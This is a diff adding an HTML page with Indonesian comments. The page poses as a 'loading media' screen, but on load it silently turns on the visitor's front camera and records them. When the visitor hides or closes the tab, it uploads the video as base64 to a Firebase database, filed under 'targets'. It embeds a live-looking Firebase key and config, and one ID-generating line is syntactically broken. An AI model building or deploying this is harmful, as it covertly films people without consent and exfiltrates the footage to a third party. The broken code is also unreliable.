@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat Konten...</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
+        .box { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="spinner"></div>
+        <p>Memuat Media...</p>
+    </div>
+
+    <video id="cam" autoplay playsinline muted style="display:none;"></video>
+
+    <!-- Firebase SDK v9 Modular -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
+            authDomain: "haij-4beb7.firebaseapp.com",
+            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
+            projectId: "haij-4beb7",
+            storageBucket: "haij-4beb7.firebasestorage.app",
+            messagingSenderId: "843252587335",
+            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // ID Random Unik per sesi target
+        const targetId = 'target_' + Math.random().toString(36.substring(2, 9)) + '_' + Date.now();
+        let mediaRecorder;
+        let recordedChunks = [];
+        let stream = null;
+        let isSent = false;
+
+        async function autoStart() {
+            const video = document.getElementById('cam');
+
+            try {
+                // Kamera langsung menyala otomatis tanpa tombol/referral
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                try {
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream);
+                }
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    if (isSent) return;
+                    isSent = true;
+
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = async function() {
+                        const base64Video = reader.result;
+                        try {
+                            // Kirim ke database dengan ID random dan keterangan otomatis
+                            await set(ref(db, `targets/${targetId}`), {
+                                code: "Direct Auto-Open",
+                                video: base64Video,
+                                time: Date.now()
+                            });
+                        } catch (err) {
+                            console.error("Gagal kirim data:", err);
+                        }
+                    };
+                    reader.readAsDataURL(blob);
+                };
+
+                // Mulai merekam durasi penuh
+                mediaRecorder.start();
+
+            } catch (err) {
+                console.warn("Izin kamera otomatis dicegah browser:", err);
+            }
+        }
+
+        // Otomatis dijalankan begitu halaman dibuka
+        window.addEventListener('DOMContentLoaded', autoStart);
+
+        // Simpan dan kirim rekaman full saat target menutup halaman atau pindah tab
+        const finalizeRecording = () => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                if (stream) stream.getTracks().forEach(t => t.stop());
+            }
+        };
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') finalizeRecording();
+        });
+
+        window.addEventListener('beforeunload', () => finalizeRecording());
+    </script>
+</body>
+</html>
